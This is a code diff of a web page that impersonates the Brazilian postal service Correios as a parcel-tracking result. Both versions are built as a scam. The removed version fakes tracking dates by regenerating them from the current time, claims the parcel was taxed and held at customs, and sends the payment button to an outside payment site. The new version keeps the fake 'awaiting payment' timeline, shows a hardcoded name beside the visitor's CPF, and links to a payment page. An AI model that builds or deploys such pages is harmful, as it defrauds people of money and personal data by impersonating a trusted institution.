@@ -1,210 +1,45 @@
+<!-- resultado.html -->
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdn.hugeicons.com/font/hgi-stroke-rounded.css" />
-    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
-    <style>
-        body {
-            font-family: 'Roboto', sans-serif;
-        }
-    </style>
-    <title>Rastreie sua Encomenda</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Resultado da Consulta</title>
+<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
 </head>
-<body>
-    <header class="p-2 text-cyan-700 text-xs bg-zinc-100">
-        <span>Acessibilidade <b class="text-xs">▼</b></span>
-    </header>
 
-    <hr class="border-white">
+<body class="bg-gray-100">
 
-    <header class="bg-zinc-100 p-2 flex items-center justify-between">
-        <i class="hgi hgi-stroke hgi-menu-01 text-2xl font-bold text-cyan-700"></i>
-        <img src="../assets/images/logo.svg" alt="Logo" class="w-30">
-        <img src="../assets/images/sair.svg" alt="Logo" class="w-8">
-    </header>
-    
-    <hr class="border-orange-500">
+<header class="bg-blue-700 text-white p-4 text-center text-xl font-semibold">
+    Resultado da Consulta
+</header>
 
-    <div class="p-3 text-xs flex items-center gap-1 text-gray-500">
-        <span>Rastreamento</span> <b class="text-lg text-cyan-700">›</b> <span>Resultado</span> <b class="text-lg text-cyan-700">›</b>
-    </div>
+<div class="max-w-3xl mx-auto mt-6 bg-white shadow p-6 rounded">
 
+    <h2 class="text-xl font-bold mb-4">Dados Encontrados</h2>
 
-    <div class="p-4">
-        <div class="p-2">
-            <h1 class="text-2xl text-bold text-cyan-800">Resultado da Consulta:</h1>
-        </div>
-        <div class="p-4 flex gap-1 flex-col h-auto rounded-md text-md">
-            <div class="mb-2 uppercase">
-                <p><b class="text-cyan-700">Nome:</b> </p>
-                <p><b class="text-cyan-700">Nascimento:</b> </p>
-                <p><b class="text-cyan-700">CPF:</b> </p>
-            </div>
-                        <button onclick="trackPaymentClick()" class="bg-sky-600 p-2 text-white">REALIZAR PAGAMENTO</button>
-        </div>
-    </div>
+    <p><strong>Nome:</strong> João da Silva</p>
+    <p><strong>Data de Nascimento:</strong> 12/05/1989</p>
+    <p><strong>CPF:</strong> <?php echo htmlspecialchars($_GET['cpf'] ?? ''); ?></p>
 
-    <div class="p-4">
-        <div class="bg-white p-4">
-            <div class="relative">
-                <div class="absolute left-6 top-0 bottom-0 w-0.5 bg-yellow-400"></div>
-                
-                <div class="flex items-start gap-4 py-4">
-                    <div class="w-12 h-12 bg-orange-400 rounded-full flex items-center justify-center flex-shrink-0 relative z-10">
-                        <i class="hgi hgi-stroke hgi-dollar-02 text-xl text-white"></i>
-                    </div>
-                    <div class="flex-1">
-                        <p class="font-bold text-orange-600 text-base">Aguardando Pagamento...</p>
-                        <p class="text-sm text-gray-600">Taxa deve ser paga para liberação do objeto</p>
-                        <p class="text-sm text-gray-500" id="date-0">17/11/2025 02:26</p>
-                    </div>
-                </div>
-                
-                <div class="flex items-start gap-4 py-4">
-                    <div class="w-12 h-12 bg-orange-400 rounded-full flex items-center justify-center flex-shrink-0 relative z-10">
-                        <i class="hgi hgi-stroke hgi-alert-01 text-lg text-white"></i>
-                    </div>
-                    <div class="flex-1">
-                        <p class="font-bold text-orange-600 text-base">Sua encomenda foi tributada</p>
-                        <p class="text-sm text-gray-600">objeto encaminhado ao centro alfandegario</p>
-                        <p class="text-sm text-gray-500" id="date-1">17/11/2025 00:26</p>
-                    </div>
-                </div>
-                
-                <div class="flex items-start gap-4 py-4">
-                    <div class="w-12 h-12 bg-yellow-400 rounded-full flex items-center justify-center flex-shrink-0 relative z-10">
-                        <i class="hgi hgi-stroke hgi-package-search text-lg text-cyan-700"></i>
-                    </div>
-                    <div class="flex-1">
-                        <p class="font-bold text-gray-800 text-base">Objeto em fiscalização</p>
-                        <p class="text-sm text-gray-600">aguarde para o resultado no proximo status</p>
-                        <p class="text-sm text-gray-500" id="date-2">16/11/2025 02:26</p>
-                    </div>
-                </div>
-                
-                <div class="flex items-start gap-4 py-4">
-                    <div class="w-12 h-12 bg-yellow-400 rounded-full flex items-center justify-center flex-shrink-0 relative z-10">
-                        <i class="hgi hgi-stroke hgi-shipping-truck-02 text-lg text-cyan-700"></i>
-                    </div>
-                    <div class="flex-1">
-                        <p class="font-bold text-gray-800 text-base">Objeto em trânsito - por favor aguarde</p>
-                        <p class="text-sm text-gray-600">de Unidade de Tratamento para Unidade de Distribuição</p>
-                        <p class="text-sm text-gray-500" id="date-3">15/11/2025 02:26</p>
-                    </div>
-                </div>
-                
-                <div class="flex items-start gap-4 py-4">
-                    <div class="w-12 h-12 bg-yellow-400 rounded-full flex items-center justify-center flex-shrink-0 relative z-10">
-                        <i class="hgi hgi-stroke hgi-shipping-truck-02 text-lg text-cyan-700"></i>
-                    </div>
-                    <div class="flex-1">
-                        <p class="font-bold text-gray-800 text-base">Objeto em trânsito - por favor aguarde</p>
-                        <p class="text-sm text-gray-600">de Unidade de Tratamento para Unidade de Tratamento</p>
-                        <p class="text-sm text-gray-500" id="date-4">14/11/2025 02:26</p>
-                    </div>
-                </div>
-                
-                <div class="flex items-start gap-4 py-4">
-                    <div class="w-12 h-12 bg-yellow-400 rounded-full flex items-center justify-center flex-shrink-0 relative z-10">
-                        <i class="hgi hgi-stroke hgi-package text-lg text-cyan-700"></i>
-                    </div>
-                    <div class="flex-1">
-                        <p class="font-bold text-gray-800 text-base">Objeto postado</p>
-                        <p class="text-sm text-gray-600">SAO PAULO - SP</p>
-                        <p class="text-sm text-gray-500" id="date-5">12/11/2025 02:26</p>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-    </div>
+    <a href="pagamento.php"
+       class="block mt-4 bg-green-600 text-white text-center p-3 rounded font-semibold">
+        Realizar Pagamento
+    </a>
 
-    <footer class="bg-yellow-400 p-6">
-        <div class="max-w-6xl mx-auto">
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-                <div>
-                    <h3 class="text-lg font-bold text-gray-800 mb-3">Fale Conosco</h3>
-                    <ul class="space-y-2">
-                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Registro de Manifestações</a></li>
-                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Central de Atendimento</a></li>
-                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Soluções para o seu negócio</a></li>
-                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Suporte ao cliente com contrato</a></li>
-                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Ouvidoria</a></li>
-                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Denúncia</a></li>
-                    </ul>
-                </div>
-                
-                <div>
-                    <h3 class="text-lg font-bold text-gray-800 mb-3">Sobre os Correios</h3>
-                    <ul class="space-y-2">
-                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Identidade corporativa</a></li>
-                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Educação e cultura</a></li>
-                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Código de ética</a></li>
-                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Transparência e prestação de contas</a></li>
-                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Política de Privacidade e Notas Legais</a></li>
-                    </ul>
-                </div>
-                
-                <div>
-                    <h3 class="text-lg font-bold text-gray-800 mb-3">Outros Sites</h3>
-                    <ul class="space-y-2">
-                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Loja online dos Correios</a></li>
-                    </ul>
-                </div>
-            </div>
-            
-            <div class="text-center mt-6 pt-4 border-t border-yellow-500">
-                <p class="text-sm text-gray-800">© Copyright 2025 Correios</p>
-            </div>
-        </div>
-    </footer>
+    <hr class="my-6">
 
-    <script>
-        function updateTimelineDates() {
-            const now = new Date();
-            const dates = [
-                now,
-                new Date(now.getTime() - 2 * 60 * 60 * 1000),
-                new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
-                new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
-                new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
-                new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000)
-            ];
+    <h3 class="text-lg font-bold mb-4">Linha do Tempo</h3>
 
-            dates.forEach((date, index) => {
-                const element = document.getElementById(`date-${index}`);
-                if (element) {
-                    const day = String(date.getDate()).padStart(2, '0');
-                    const month = String(date.getMonth() + 1).padStart(2, '0');
-                    const year = date.getFullYear();
-                    const hours = String(date.getHours()).padStart(2, '0');
-                    const minutes = String(date.getMinutes()).padStart(2, '0');
-                    
-                    element.textContent = `${day}/${month}/${year} ${hours}:${minutes}`;
-                }
-            });
-        }
+    <ul class="space-y-3">
+        <li class="p-3 bg-gray-200 rounded">✔ Aguardando pagamento</li>
+        <li class="p-3 bg-gray-200 rounded">✔ Encomenda tributada</li>
+        <li class="p-3 bg-gray-200 rounded">✔ Objeto em fiscalização</li>
+        <li class="p-3 bg-gray-200 rounded">✔ Objeto em trânsito</li>
+        <li class="p-3 bg-gray-200 rounded">✔ Objeto postado</li>
+    </ul>
 
-        updateTimelineDates();
-        setInterval(updateTimelineDates, 60000);
-
-        function trackPaymentClick() {
-            fetch('../includes/tracking.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: 'action=payment_click'
-            });
-            
-            window.location.href = 'https://pay.pagtaxabr.site/QqyLgqnOVJa3vkE';
-        }
-    </script>
+</div>
 
 </body>
 </html>
